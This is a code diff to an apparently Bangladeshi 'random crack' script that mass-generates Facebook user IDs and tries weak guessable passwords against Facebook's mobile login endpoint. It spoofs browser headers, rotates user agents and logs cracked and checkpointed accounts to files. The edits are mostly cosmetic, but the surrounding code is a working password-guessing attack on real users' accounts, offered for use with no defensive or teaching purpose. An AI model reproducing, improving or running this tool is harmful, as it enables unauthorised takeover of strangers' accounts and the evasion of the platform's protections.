@@ -105,17 +105,19 @@ logo1 = ("""
                          """)
 
 def mumitx():
-	print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+	print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
 
 def Main():
         os.system("clear")
         print(logo)
-        print("\033[1;35m[\033[1;32mA\033[1;35m]\033[1;32m RANDOM CRACK")
-        print("\033[1;35m[\033[1;32mB\033[1;35m]\033[1;32m Exit")
-        Mumit =input("\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m Choose : ")
-        if Mumit in ["A","01"]:
+        print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+        print("\033[1;35m [\033[1;32mA\033[1;35m]\033[1;32m RANDOM CRACK")
+        print("\033[1;35m [\033[1;32mB\033[1;35m]\033[1;32m Exit")
+        print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+        Mumit =input("\033[1;35m [\033[1;32m?\033[1;35m]\033[1;32m Choose : ")
+        if Mumit in ["A","1"]:
             fuck()
-        if Mumit in [" B", "00"]:
+        if Mumit in [" B", "0"]:
             exit()
         else:
             exit()
@@ -124,12 +126,16 @@ def fuck():
     user=[]
     os.system('clear')
     print(logo)
-    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE CODE: 017, 018, 019, 016')
-    code = input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE CODE : ')
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+    print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE CODE: 017, 018, 019, 016')
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+    code = input('\033[1;35m [\033[1;32m?\033[1;35m]\033[1;32m CHOOSE CODE : ')
     os.system('clear')
     print(logo)
-    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE: 2000 3000 5000 10000 ')
-    limit = int(input('\033[1;35m[\033[1;32m?\033[1;35m]\033[1;32m CHOOSE : '))
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+    print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m EXAMPLE: 2000 3000 5000 10000 ')
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+    limit = int(input('\033[1;35m [\033[1;32m?\033[1;35m]\033[1;32m CHOOSE : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
@@ -137,21 +143,21 @@ def fuck():
         os.system('clear')
         print(logo1)
         tl = str(len(user))
-        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
-        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Total ids: '+tl)
-        print("\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Your Code: "+code)
-        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Process has been started')
-        print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Use flight mode for speed up')
-        print("\033[1;91m<\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+        print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+        print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m Total ids: '+tl)
+        print("\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m Your Code: "+code)
+        print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m Process has been started')
+        print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m Use ✈️ Mode for Speed up')
+        print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
         for guru in user:
             uid = code+guru
             pwx = [guru,uid,uid[:7],uid[:6],'bangladesh']
             yaari.submit(mumit2,uid,pwx,tl)
-    print(mumitx)
-    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m Crack process has been completed')
-    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m OK Ids saved in ALEN/OK.txt')
-    print('\033[1;35m[\033[1;32m+\033[1;35m]\033[1;32m CP Ids saved in ALEN/CP.txt')
-    print(mumitx)
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
+    print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m Crack process has been completed')
+    print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m OK Ids saved in ALEN/OK.txt')
+    print('\033[1;35m [\033[1;32m+\033[1;35m]\033[1;32m CP Ids saved in ALEN/CP.txt')
+    print("\033[1;91m <\033[1;97m══════════════════════════════════════\033[1;91m>\033[1;92m")
        
 def mumit2(uid,pwx,tl):
     global loop
@@ -162,7 +168,7 @@ def mumit2(uid,pwx,tl):
         for ps in pwx:
             pro = random.choice(ugen)
             session = requests.Session()
-            sys.stdout.write('\r\033[1;92m[ALEN]<•>[%s/%s]<•>[OK-%s]<•>[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
+            sys.stdout.write('\r\033[1;92m [ALEN]<•>[%s/%s]<•>[OK-%s]<•>[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
             free_fb = session.get('https://mbasic.facebook.com').text
             log_data = {
@@ -185,16 +191,17 @@ def mumit2(uid,pwx,tl):
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
             'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"LM-G710N"',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-platform': '"Linux"',
+            'sec-ch-ua-platform-version': '""',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': pro}
+            'user-agent': pro,
+            'viewport-width': '980',}
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=101',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
